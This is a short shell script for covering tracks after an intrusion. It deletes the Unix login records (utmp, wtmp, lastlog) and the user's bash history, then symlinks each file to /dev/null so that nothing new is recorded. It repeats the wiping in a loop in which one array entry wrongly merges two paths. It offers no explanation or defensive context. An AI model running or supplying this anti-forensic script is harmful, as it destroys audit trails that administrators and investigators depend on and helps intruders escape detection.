rm -rf /var/run/utmp
rm -rf /var/log/wtmp
rm -rf /var/log/lastlog
rm -rf ~/.bash_history
ln -s /dev/null ~/.bash_history


logs=( "/var/run/utmp" "/var/log/wtmp" "/var/log/lastlog  ~/.bash_history" )
for file in "${logs[@]}"
do
	echo $file
	rm -rf $file
    ln -s /dev/null $file
done

cd 
#for f in $
#do 
#	echo $f
#done